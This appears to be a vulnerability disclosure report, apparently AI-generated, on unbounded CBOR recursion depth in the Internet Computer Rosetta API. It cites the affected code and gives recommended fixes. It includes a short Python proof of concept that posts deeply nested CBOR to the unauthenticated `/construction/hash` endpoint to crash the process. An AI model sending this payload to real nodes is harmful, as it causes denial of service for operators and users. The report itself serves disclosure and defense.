The key code is confirmed. Let me verify the `serde_cbor` version used and whether any depth-limiting wrappers exist.

### Title
Unbounded CBOR Deserialization Depth in `SignedTransaction::from_str` Causes Stack Overflow / OOM — (`rs/rosetta-api/icp/src/models.rs`)

---

### Summary

`SignedTransaction::from_str` calls `serde_cbor::from_slice` twice with no recursion depth limit on attacker-controlled bytes. A crafted deeply-nested CBOR payload sent to the public `/construction/hash` endpoint can exhaust the Rosetta process's stack, causing an unrecoverable crash.

---

### Finding Description

`SignedTransaction::from_str` hex-decodes the caller-supplied string and passes the raw bytes directly to `serde_cbor::from_slice` with no depth guard: [1](#0-0) 

```rust
fn from_str(s: &str) -> Result<Self, Self::Err> {
    let bytes = hex::decode(s).map_err(|err| format!("{err:?}"))?;
    serde_cbor::from_slice(bytes.as_slice()).or_else(|first_err| {
        serde_cbor::from_slice::<LegacySignedTransaction>(bytes.as_slice())
            ...
    })
}
```

`serde_cbor` (0.11.x) uses recursive descent: each nested CBOR array or map adds a stack frame. There is no `max_recursion_depth` or iterative-parse option configured anywhere in the ICP Rosetta codebase.

The HTTP server sets a 4 MB JSON body limit: [2](#0-1) 

A hex string of ~4 MB decodes to ~2 MB of raw CBOR. CBOR indefinite-length arrays (`0x9f … 0xff`) cost 2 bytes per nesting level, so ~1 million nesting levels fit within the budget — far exceeding any realistic stack depth. If the first parse fails, the same bytes are fed to a second `serde_cbor::from_slice` call (the `LegacySignedTransaction` fallback), doubling the work.

The endpoint is public and unauthenticated: [3](#0-2) 

The same pattern also appears in `construction_submit` and `construction_parse`: [4](#0-3) 

---

### Impact Explanation

In Rust, a stack overflow is not a catchable panic — it terminates the process via `SIGSEGV`/`SIGABRT`. A single malformed HTTP request crashes the entire Rosetta node. Because Rosetta is a single-process service (no worker isolation per request), one request kills all in-flight operations and blocks all subsequent ones until the operator restarts the process.

---

### Likelihood Explanation

The endpoint requires no authentication. The payload is trivially constructable (a loop writing `0x9f` bytes). The 4 MB JSON limit is the only gate, and it is far too permissive to prevent this. The attack is repeatable: after a restart the attacker can crash the process again immediately.

---

### Recommendation

1. **Replace `serde_cbor::from_slice` with a depth-limited deserializer.** `serde_cbor` exposes `Deserializer::from_slice` which can be wrapped with a custom `serde::de::DeserializeSeed` that counts depth, or switch to `ciborium` which supports configurable recursion limits.
2. **Add a pre-check on decoded byte length** before deserialization (e.g., reject payloads > 64 KB for this endpoint, since legitimate signed transactions are small).
3. **Run the deserialization in a thread with an explicit stack size limit** (`std::thread::Builder::new().stack_size(...)`) so a stack overflow kills only that thread, not the process.

---

### Proof of Concept

```python
import requests, struct

# Build deeply nested CBOR: 500_000 levels of indefinite-length array
depth = 500_000
cbor = b'\x9f' * depth + b'\xff' * depth   # ~1 MB

payload = {
    "network_identifier": {"blockchain": "Internet Computer", "network": "00000000000000020101"},
    "signed_transaction": cbor.hex()
}

requests.post("http://<rosetta-host>:8080/construction/hash", json=payload)
# Rosetta process crashes with SIGSEGV (stack overflow in serde_cbor recursive descent)
```

The two `serde_cbor::from_slice` calls at [5](#0-4) 

will both attempt to recursively traverse 500 000 nesting levels, overflowing the thread stack before returning any error.

### Citations

**File:** rs/rosetta-api/icp/src/models.rs (L39-48)
```rust
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        let bytes = hex::decode(s).map_err(|err| format!("{err:?}"))?;
        serde_cbor::from_slice(bytes.as_slice()).or_else(|first_err| {
            serde_cbor::from_slice::<LegacySignedTransaction>(bytes.as_slice())
                .map(|legacy_requests| SignedTransaction {
                    requests: legacy_requests,
                })
                .map_err(|_| format!("{first_err:?}"))
        })
    }
```

**File:** rs/rosetta-api/icp/src/models.rs (L185-195)
```rust
                serde_cbor::from_slice(&from_hex(&value.transaction)?).map_err(|e| {
                    ApiError::invalid_request(format!("Could not decode signed transaction: {e}"))
                })?,
            ))
        } else {
            Ok(ParsedTransaction::Unsigned(
                serde_cbor::from_slice(&from_hex(&value.transaction)?).map_err(|e| {
                    ApiError::invalid_request(format!("Could not decode unsigned transaction: {e}"))
                })?,
            ))
        }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L97-104)
```rust
#[post("/construction/hash")]
async fn construction_hash(
    msg: web::Json<ConstructionHashRequest>,
    req_handler: web::Data<RosettaRequestHandler>,
) -> HttpResponse {
    let res = req_handler.construction_hash(msg.into_inner());
    to_rosetta_response(res, &req_handler.rosetta_metrics())
}
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L297-299)
```rust
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
```
